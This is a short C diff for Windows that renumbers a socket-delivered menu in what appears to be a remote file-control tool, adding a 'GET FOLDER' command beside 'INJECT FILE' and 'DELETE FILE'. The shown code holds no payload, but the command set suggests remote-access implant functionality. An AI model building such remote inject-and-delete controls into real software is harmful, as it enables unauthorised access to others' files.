@@ -1,4 +1,5 @@
 #include "seeDirectory.h"
+#include "cpy.h"
 
 void showMenu(void * paramT) {
 	if(paramT == NULL) return;
@@ -43,12 +44,17 @@ void showMenu(void * paramT) {
 	memset(buffer, 0, strlen(buffer));
 	Sleep(11);
 
-	strcpy(buffer, "7. INJECT FILE\n");
+	strcpy(buffer, "7. GET FOLDER\n");
 	send((param)->clientSocket, buffer, strlen(buffer), 0);
 	memset(buffer, 0, strlen(buffer));
 	Sleep(11);
 
-	strcpy(buffer, "8. DELETE FILE\n");
+	strcpy(buffer, "8. INJECT FILE\n");
+	send((param)->clientSocket, buffer, strlen(buffer), 0);
+	memset(buffer, 0, strlen(buffer));
+	Sleep(11);
+
+	strcpy(buffer, "9. DELETE FILE\n");
 	send((param)->clientSocket, buffer, strlen(buffer), 0);
 	memset(buffer, 0, strlen(buffer));
 	Sleep(11);
@@ -223,11 +229,16 @@ DWORD WINAPI surfMode(LPVOID paramS) {
 				GETFILE(param);
 				break;
 
-			case '7':	//INJECT FILE
+			case '7':	//GET FOLDER
+				showInorderFile(param);
+				exec((param)->dir, param);
+				break;
+
+			case '8':	//INJECT FILE
 				showInorderFile(param);
 				break;
 
-			case '8':	//DELETE FILE
+			case '9':	//DELETE FILE
 				showInorderFile(param);
 				break;
 
